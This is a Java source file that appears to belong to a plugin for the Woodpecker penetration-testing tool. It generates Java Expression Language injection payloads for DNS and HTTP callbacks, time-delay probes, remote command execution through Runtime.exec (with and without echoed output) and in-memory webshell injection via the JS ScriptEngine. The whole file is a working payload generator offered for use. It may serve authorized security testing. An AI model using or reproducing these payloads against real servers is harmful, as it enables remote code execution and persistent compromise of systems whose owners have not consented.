package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;
import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class ELExpr implements IExpr {

    @Override
    public String getName() {
        return "EL";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                "\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\", \"\".getClass()).invoke(null, \"" + escape(domain, "\"") + "\")"
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                "\"\".getClass().forName(\"java.net.URL\").declaredConstructors[2].newInstance(\"" + escape(url, "\"") + "\").getContent()"
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                "Thread.sleep(" + sec * 1000 + ")"
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                "Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\")",
                "\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec('" + escape(command, "'") + "')"
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();')"
        };
    }

    @Override
    public String[] genMemShell(byte[] memShellClass) {
        try {
            return new String[]{
                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64)) + "')" + System.lineSeparator() + " <==",
                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + "')" + System.lineSeparator() + " <=="
            };
        } catch (Exception ex) {
            return new String[]{
                    "class文件异常"
            };
        }
    }
}
